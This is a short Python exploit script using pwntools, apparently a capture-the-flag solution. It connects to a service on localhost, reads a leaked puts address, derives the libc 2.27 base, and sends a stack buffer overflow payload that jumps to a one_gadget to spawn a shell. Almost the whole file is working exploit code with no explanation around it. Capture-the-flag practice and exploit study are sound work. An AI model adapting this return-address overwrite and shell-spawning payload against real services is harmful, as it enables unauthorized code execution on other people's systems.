#!/usr/bin/env python3

from pwn import *

p = remote('localhost', 9999) # fill in host/port here

# we can determine that the libc version is libc6_2.27-3ubuntu1_amd64 based on the leak using https://libc.blukat.me/?q=puts%3A7f5c448899c0&l=libc6_2.27-3ubuntu1_amd64

p.recvuntil(b'but there is 0x')
puts_leak = int(p.recvuntil('.\n', drop=True), 16)
libc_base = puts_leak - 0x0809c0
one_gadget = libc_base + [0x4f2c5, 0x4f322, 0x10a38c][0]

payload = b'A'*40 + b'B'*(0x8*2) + p64(one_gadget)

p.sendlineafter(b'Get a shell: ', payload)
p.interactive()
